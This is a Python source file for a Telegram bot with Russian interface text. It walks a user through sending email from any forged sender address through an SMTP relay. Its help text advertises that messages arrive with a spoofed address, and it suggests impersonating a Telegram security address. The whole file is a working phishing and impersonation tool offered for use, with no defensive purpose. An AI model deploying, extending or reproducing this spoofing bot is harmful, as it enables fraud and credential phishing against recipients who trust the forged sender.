# bot.py
# SWILL // 26.09.2025 // Telegram спуфинг-бот для Railway

import smtplib
import os
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.header import Header
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, CallbackQueryHandler

# ========== ПЕРЕМЕННЫЕ ИЗ RAILWAY ==========
BOT_TOKEN = os.environ.get("BOT_TOKEN")
SMTP_SERVER = os.environ.get("SMTP_SERVER", "mxslurp.click")
SMTP_PORT = int(os.environ.get("SMTP_PORT", 2525))
MAILSLURP_USER = os.environ.get("MAILSLURP_USER")
MAILSLURP_PASS = os.environ.get("MAILSLURP_PASS")

if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN не задан в переменных Railway")
if not MAILSLURP_USER or not MAILSLURP_PASS:
    raise ValueError("MAILSLURP_USER и MAILSLURP_PASS не заданы")
# ===========================================

user_data = {}

def send_spoof_email(from_email, to_email, subject, body):
    try:
        msg = MIMEMultipart()
        msg["From"] = from_email
        msg["To"] = to_email
        msg["Subject"] = Header(subject, "utf-8").encode()
        msg.attach(MIMEText(body, "plain", "utf-8"))
        
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT, timeout=30)
        server.starttls()
        server.login(MAILSLURP_USER, MAILSLURP_PASS)
        server.sendmail(from_email, [to_email], msg.as_string())
        server.quit()
        return True, "✅ Письмо отправлено!"
    except Exception as e:
        return False, f"❌ Ошибка: {str(e)[:100]}"

async def start(update: Update, context: CallbackContext):
    await update.message.reply_text(
        "📧 *Spoof Mailer Bot*\n\n"
        "Отправляю письма с ЛЮБОГО фейкового email.\n\n"
        "Используй кнопки:",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("✍️ Новое письмо", callback_data="new_mail")],
            [InlineKeyboardButton("ℹ️ Помощь", callback_data="help")]
        ])
    )

async def button_handler(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if query.data == "new_mail":
        user_data[user_id] = {"step": "from"}
        await query.edit_message_text(
            "📝 *Шаг 1 из 4*\n\n"
            "Введи *от кого* (любой email, например `security@telegram.org`):",
            parse_mode="Markdown"
        )
    elif query.data == "help":
        await query.edit_message_text(
            "📖 *Как работает бот:*\n\n"
            "1. Ты вводишь любой фейковый email отправителя\n"
            "2. Вводишь реальный email получателя\n"
            "3. Вводишь тему письма\n"
            "4. Вводишь текст письма\n"
            "5. Бот отправляет письмо через SMTP\n\n"
            "⚡️ Письмо приходит с подменённым адресом!\n\n"
            "🔄 Нажми /start для нового письма",
            parse_mode="Markdown"
        )

async def handle_message(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    text = update.message.text
    
    if user_id not in user_data or "step" not in user_data[user_id]:
        await update.message.reply_text("Нажми /start")
        return
    
    step = user_data[user_id]["step"]
    
    if step == "from":
        user_data[user_id]["from"] = text
        user_data[user_id]["step"] = "to"
        await update.message.reply_text(f"Отправитель: `{text}`\n\n📥 Введи email *получателя*:", parse_mode="Markdown")
    elif step == "to":
        user_data[user_id]["to"] = text
        user_data[user_id]["step"] = "subject"
        await update.message.reply_text(f"Получатель: `{text}`\n\n📌 Введи *тему* письма:", parse_mode="Markdown")
    elif step == "subject":
        user_data[user_id]["subject"] = text
        user_data[user_id]["step"] = "body"
        await update.message.reply_text(f"Тема: `{text}`\n\n📝 Введи *текст* письма:", parse_mode="Markdown")
    elif step == "body":
        user_data[user_id]["body"] = text
        data = user_data[user_id]
        await update.message.reply_text("⏳ Отправляю...")
        success, msg = send_spoof_email(data["from"], data["to"], data["subject"], data["body"])
        await update.message.reply_text(f"{msg}\n\nОт: `{data['from']}`\nКому: `{data['to']}`\nТема: `{data['subject']}`\n\n/start для нового", parse_mode="Markdown")
        del user_data[user_id]

async def cancel(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id in user_data:
        del user_data[user_id]
    await update.message.reply_text("❌ Отменено. Нажми /start.")

if __name__ == "__main__":
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cancel", cancel))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    print("✅ Бот запущен на Railway")
    app.run_polling()
